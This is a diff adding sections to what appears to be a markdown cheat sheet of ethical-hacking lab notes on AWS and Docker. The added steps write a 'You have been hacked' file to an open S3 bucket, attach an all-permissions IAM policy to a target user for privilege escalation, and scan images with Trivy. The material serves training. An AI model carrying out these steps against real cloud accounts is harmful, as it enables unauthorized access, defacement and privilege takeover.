@@ -2261,3 +2261,111 @@ Now, to get login information for a user type Get-AADIntLoginInformation -Domain
 to get the tenant ID for the given user, domain, or Access Token, type Get-AADIntTenantID -Domain company.com.
 to get registered domains from the tenant of the given domain Get-AADIntTenantDomains -Domain company.com
 ```
+</details>
+<details>
+<summary>Exploit open S3 buckets using AWS CLI</summary>
+
+```console
+:~$ Listed below are several techniques that can be adopted to identify AWS S3 Buckets:
+
+Inspecting HTML: Analyze the source code of HTML web pages in the background to find URLs to the target S3 buckets
+Brute-Forcing URL: Use Burp Suite to perform a brute-force attack on the target bucket's URL to identify its correct URL
+Finding subdomains: Use tools such as Findsubdomains and Robtex to identify subdomains related to the target bucket
+Reverse IP Search: Use search engines such as Bing to perform reverse IP search to identify the domains of the target S3 buckets
+Advanced Google hacking: Use advanced Google search operators such as "inurl" to search for URLs related to the target S3 buckets
+```
+```console
+:~$cd to root
+In the terminal window, type pip3 install awscli
+
+Now, we need to configure AWS CLI. To configure AWS CLI in the terminal window, type aws configure
+to provide the asked details we have to login to the aws account
+https://console.aws.amazon.com
+Click the AWS account drop-down menu and click Security credentials,
+in cmd
+In the Default region name field, type eu-west-1 and press Enter.
+ have created an open S3 bucket with the name certifiedhacker02 
+ list the directories in the certifiedhacker02 bucket. In the terminal window, type........ aws s3 ls s3://[Bucket Name] (here, Bucket Name is certifiedhacker02) and press Enter.
+
+```
+```console
+:~$ in the browser window, type certifiedhacker02.s3.amazonaws.com
+switch to Terminal.
+Let us move some files to the certifiedhacker02 bucket. To do this, in the terminal window, type echo "You have been hacked" >> Hack.txt and press Enter.
+in the terminal window, type aws s3 mv Hack.txt s3://certifiedhacker02 and press Enter.
+to verify refresh the browser window
+
+to delete the file
+type aws s3 rm s3://certifiedhacker02/Hack.txt
+```
+</details>
+<details>
+
+<summary> Escalate IAM User Privileges by Exploiting Misconfigured User Policy</summary>
+
+```console
+:~$ Before starting this task, create an IAM user (Test) with default settings and create a policy (Test) with permissions including, iam:AttachUserPolicy, iam:ListUserPolicies, sts:AssumeRole, and iam:ListRoles, as shown in the below screenshot. These policies can be exploited by attackers to gain administrator-level privileges.
+```
+
+```console
+:~$ we need to configure aws cli for this lab
+then
+cd
+vim user-policy.json
+paste
+{
+"Version":"2012-10-17",
+
+"Statement": [
+ {
+
+
+
+        "Effect":"Allow",
+
+        "Action":"*",
+
+        "Resource":"*"
+
+    }
+
+]
+}
+After entering the script given in the previous step, press the Esc button. Then, type :wq! and press Enter to save the text document.
+then
+aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json (policy name you have created vim if any error rename the file)
+then
+ aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy 
+ and next
+  aws iam list-attached-user-policies --user-name [Target Username]
+  to list user name
+  aws iam list-users
+  ```
+  ```console
+  :~$ Similarly, you can use various commands to obtain complete information about the AWS environment such as the list of S3 buckets, user policies, role policies, and group policies, as well as to create a new user.
+
+List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"
+
+User Policies: aws iam list-user-policies
+
+Role Policies: aws iam list-role-policies
+
+Group policies: aws iam list-group-policies
+
+Create user: aws iam create-user
+```
+</details>
+<details>
+<summary>Vulnerability Assessment on Docker Images using Trivy</summary>
+
+```console
+:~$Parrot Security machine, click the MATE Terminal 
+to scan secure img
+Execute command.... docker pull ubuntu to install the first docker image
+ trivy image ubuntu
+now to scan vulnerable img
+ docker pull nginx:1.19.6
+ trivy image nginx:1.19.6 to scan the image.
+ use grep to find the ansr
+ ```
+ </details>
